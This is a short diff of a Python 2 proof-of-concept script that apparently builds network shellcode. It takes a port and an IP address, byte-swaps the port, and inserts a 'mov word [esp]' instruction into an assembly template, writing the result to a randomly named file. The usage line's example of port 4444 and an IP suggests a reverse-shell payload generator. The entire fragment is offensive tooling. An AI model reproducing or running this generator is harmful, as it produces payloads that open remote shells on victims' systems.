@@ -9,7 +9,7 @@ os.system('clear')
 
 if len(sys.argv) != 3:
    
-    print "[x] usage: ./poc.py p ip"
+    print "[x] usage: ./poc.py port ipaddress (ex. 4444 10.0.7.17)"
     sys.exit(0)
 
 
@@ -32,10 +32,33 @@ for x in stuff[::-1]:
         insertAt += 1
     offset += 1
 
-uuidFilePath = os.getcwd() + str(uuid.uuid4())
+insertAt = content.index(";port-before-here")
 
+#push word 0x5C11     ; port number (least significant byte first ... 0x115C is 4444)
+
+stuff = str(format(int(sys.argv[1]), '04x'))
+
+finalPort = "0x"
+
+if stuff[2:] != '00':
+    finalPort += str(stuff[2:])
+
+finalPort += str(stuff[:2])
+
+finalPort = "mov word [esp], " + finalPort
+
+content.insert(insertAt, finalPort)
+
+uuidFileName = str(uuid.uuid4())
+
+thefile = open(uuidFileName, 'w')
 for x in content:
-   print x
+   thefile.write(x)
+   thefile.write("\n")
 
-print uuidFilePath
+thefile.close()
+
+#os.remove(uuidFileName)
+
+#print uuidFilePath
 
